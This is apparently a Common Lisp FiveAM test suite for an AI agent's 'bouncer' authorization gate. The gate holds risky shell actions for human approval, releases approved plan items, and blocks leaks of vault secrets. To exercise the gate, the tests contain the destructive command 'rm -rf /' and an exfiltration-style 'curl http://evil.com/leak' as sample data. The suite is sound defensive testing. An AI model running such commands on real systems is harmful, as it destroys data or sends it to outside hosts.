(defpackage :org-agent-bouncer-tests
  (:use :cl :fiveam :org-agent)
  (:export #:bouncer-suite))
(in-package :org-agent-bouncer-tests)

(def-suite bouncer-suite :description "Tests for System 2 Bouncer & Authorization Gate.")
(in-suite bouncer-suite)

(test test-bouncer-interception
  "Verify that a high-risk action is intercepted by the bouncer."
  (let* ((action '(:type :REQUEST :target :shell :payload (:cmd "rm -rf /")))
         (context '(:payload (:sensor :test)))
         ;; decide-gate expects a signal plist with a :candidate
         (signal (list :candidate action :payload '(:sensor :test)))
         (result (org-agent:decide-gate signal)))
    (let ((approved (getf result :approved-action)))
      ;; Result should be an EVENT requiring approval, not the original REQUEST
      (is (not (null approved)))
      (is (eq :EVENT (getf approved :type)))
      (is (eq :approval-required (getf (getf approved :payload) :sensor)))
      (is (equal action (getf (getf approved :payload) :action))))))

(test test-bouncer-bypass
  "Verify that an approved action bypasses the bouncer."
  (let* ((action '(:type :REQUEST :target :shell :payload (:cmd "ls") :approved t))
         (context '(:payload (:sensor :test)))
         (signal (list :candidate action :payload '(:sensor :test)))
         (result (org-agent:decide-gate signal)))
    (let ((approved (getf result :approved-action)))
      ;; Result should be the original action because it has :approved t
      (is (not (null approved)))
      (is (equal action approved)))))

(test test-bouncer-approval-reaction
  "Verify that the bouncer skill re-injects an action when a plan node is APPROVED."
  (clrhash org-agent::*object-store*)
  (let* ((action '(:type :REQUEST :target :telegram :payload (:text "hello")))
         (node-id "plan-1"))
    ;; 1. Setup an APPROVED flight plan node
    (setf (gethash node-id org-agent::*object-store*)
          (org-agent::make-org-object 
           :id node-id 
           :attributes `(:TITLE "Flight Plan" :TODO "APPROVED" :TAGS ("FLIGHT_PLAN") :ACTION ,(format nil "~s" action))))
    
    ;; 2. Manually trigger the bouncer's approval checker
    (let ((result (org-agent::bouncer-process-approvals)))
      (is (eq t result))
      ;; The node should now be DONE
      (let ((obj (gethash node-id org-agent::*object-store*)))
        (is (equal "DONE" (getf (org-agent:org-object-attributes obj) :TODO)))))))

(test test-bouncer-secret-exposure
  "Verify that the bouncer blocks leakage of secrets from the vault."
  (let ((old-vault org-agent::*vault-memory*))
    (unwind-protect
         (progn
           (setf org-agent::*vault-memory* (make-hash-table :test 'equal))
           (setf (gethash ":test-secret-api-key" org-agent::*vault-memory*) "SUPER-SECRET-12345")
           
           (let* ((action '(:type :REQUEST :target :telegram :payload (:text "My key is SUPER-SECRET-12345")))
                  (result (org-agent::bouncer-check action nil)))
             (is (not (eq result action)))
             (is (eq :log (getf result :type)))
             (is (search "Potential exposure of :test-secret" (getf (getf result :payload) :text)))))
      (setf org-agent::*vault-memory* old-vault))))

(test test-bouncer-network-exfiltration
  "Verify that unwhitelisted network calls are intercepted."
  (let ((action '(:type :REQUEST :target :shell :payload (:cmd "curl http://evil.com/leak"))))
    (let ((result (org-agent::bouncer-check action nil)))
      (is (not (null result)))
      (is (eq :EVENT (getf result :type)))
      (is (eq :approval-required (getf (getf result :payload) :sensor))))))
